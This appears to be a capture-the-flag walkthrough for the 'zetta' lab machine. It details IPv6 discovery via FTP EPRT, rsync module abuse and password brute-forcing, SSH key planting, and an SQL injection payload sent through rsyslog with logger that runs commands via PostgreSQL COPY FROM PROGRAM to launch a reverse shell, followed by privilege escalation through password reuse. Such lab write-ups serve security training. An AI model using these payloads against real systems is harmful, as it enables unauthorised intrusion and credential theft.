@@ -1,0 +1,164 @@
+User Shell:
+
+Frist browsing 10.10.10.156
+
+found out that there's creds on webpage.(will refresh every time)
+Use it to login to ftp, but can't find anything interesting.
+
+On the website we'll find that they trying to import DUAL-STACK
+And support RFC 2428 (ftp ipv6 extension)
+So we find for ipv6 to get a better chance.
+
+
+Here's the detail about RFC 2428 :
+https://tools.ietf.org/html/rfc2428
+We could find out that EPRT is the PRT command ipv6 extension.
+Allows for the specification of an extended address for the data connection.
+
+
+So we login ftp 10.10.10.156 with creds
+typing quote EPRT |2|our_ipv6|port|
+because dunno why my kali can't revice the connection(port refused, even I nc to listen it)
+So we typed quote LIST to list all the connections, why ?
+Cause we using tcpdump at the same time to sniff the package to find out zetta's ipv6.
+
+about quote : https://blog.csdn.net/qq981378640/article/details/52265835
+
+After that , we nmap it , found out that there's a rsync service on it.
+8730/tcp  open     rsync   (protocol version 31)
+
+we using this command:
+rsync -av [dead:beef::250:56ff:feb9:5d61]:: --port=8730
+we'll find out there's some module :
+This rsync server is solely for access to the zetta master server.
+The modules you see are either provided for "Backup access" or for
+"Cloud sync".
+
+
+bin            	Backup access to /bin
+boot           	Backup access to /boot
+lib            	Backup access to /lib
+lib64          	Backup access to /lib64
+opt            	Backup access to /opt
+sbin           	Backup access to /sbin
+srv            	Backup access to /srv
+usr            	Backup access to /usr
+var            	Backup access to /var
+
+
+about module see this:
+https://forums.gentoo.org/viewtopic-t-520841-start-0.html
+
+Now we try to figure out smt, but nothing interesting.
+At this moment, we can see that those modules r important linux dirs.
+So why not try other dirs? So we can get smt evil !
+
+Turns out this worked :
+rsync -av [dead:beef::250:56ff:feb9:94c9]::etc . --port=8730
+
+and the server will rsync the /etc dirs to our kali linux.
+
+We download the /etc as etc_server on kali , and we can see there's an interesting file:
+rsyncd.conf
+
+cat it out :
+
+Found there's another hidden module home_roy
+
+So we download it as roy dir at our kali by using :
+rsync -av [dead:beef::250:56ff:feb9:94c9]::home_roy . --port=8730
+
+BUT, now here we need a rsync creds for home_roy module
+We brute force it by my script( name as bruteforce_roy.py )
+
+we got the password : computer
+After that we can generate a ssh by ssh-keygen 
+and mkdir a .ssh folder 
+and add authorized_keys as public key
+after that , rsync our .ssh folder to /home/roy folder, so that we can login as roy :D
+
+I create a script done all the steps so far to get a user shell
+I named it get_ipv6_rsyncin.py
+Check that out.
+
+==========================================================================================
+
+Root Shell:
+there r some interesing git there:
+
+
+roy@zetta:~$ find / -name ".git" 2>/dev/null
+/etc/pure-ftpd/.git
+/etc/nginx/.git
+/etc/rsyslog.d/.git
+
+copy the /etc/rsynclog.d/.git
+git clone /etc/rsynclog.d/.git /tmp/bug
+
+done.
+
+cat the pgsql.conf
+
+Found out that psql will write files as system log: 7th part , local7.info
+local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
+
+but the creds here is been modified after we git, it's the box's policy.
+
+But we can go further more by seeing those template:
+template(name="sql-syslog" type="list" option.sql="on") {
+  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
+  property(name="msg")
+  constant(value="','")
+  property(name="timereported" dateformat="pgsql" date.inUTC="on")
+  constant(value="')")
+}
+
+
+Article: https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5#targetText=Authenticated%20Arbitrary%20Command%20Execution%20on%20PostgreSQL%209.3%20%3E%20Latest&targetText=PostgreSQL%2C%20commonly%20known%20as%20Postgres,Linux%20and%20Windows%20versions%20available.
+
+
+Affected psql version :
+https://nosec.org/home/detail/2368.html
+
+and check the psql version : 
+
+
+The template show it'll input two values to message, devicereportedtime
+and the `'` seems will be filtered ,
+So to the docs, we use \$ instead of '
+
+
+
+This is the payload: 
+logger -p local7.info "',now());CREATE table if not exists test(t TEXT);COPY test(t) from program \$\$cmd\$\$;-- -"
+
+For some reason, cant just straight launching a rev shell by payload.
+But we could upload shell.sh (bash reverse shell by PT monkey)
+And told the payload to run:
+logger -p local7.info "',now());CREATE table if not exists test(t TEXT);COPY test(t) from program \$\$/tmp/shell.sh\$\$;-- -"
+
+Now we get the nc reverse shell.
+
+After logging as postgres, we could copy the id_rsa at his home .ssh dir.
+
+We can cat the .psql_history:
+postgres@zetta:~$ cat .psql_history 
+CREATE DATABASE syslog;
+\c syslog
+CREATE TABLE syslog_lines ( ID serial not null primary key, CustomerID bigint, ReceivedAt timestamp without time zone NULL, DeviceReportedTime timestamp without time zone NULL, Facility smallint NULL, Priority smallint NULL, FromHost varchar(60) NULL, Message text, NTSeverity int NULL, Importance int NULL, EventSource varchar(60), EventUser varchar(60) NULL, EventCategory int NULL, EventID int NULL, EventBinaryData text NULL, MaxAvailable int NULL, CurrUsage int NULL, MinUsage int NULL, MaxUsage int NULL, InfoUnitID int NULL , SysLogTag varchar(60), EventLogType varchar(60), GenericFileName VarChar(60), SystemID int NULL);
+\d syslog_lines
+ALTER USER postgres WITH PASSWORD 'sup3rs3cur3p4ass@postgres';
+
+
+
+Now we should remember as we login as roy , there's a .tudu.xml
+
+<title>Change shared password scheme from &lt;secret&gt;@userid to something more secure.</title>
+
+
+So we change the creds' postgres to @root
+now su it
+
+input the password : sup3rs3cur3p4ass@root
+
+We r root now.
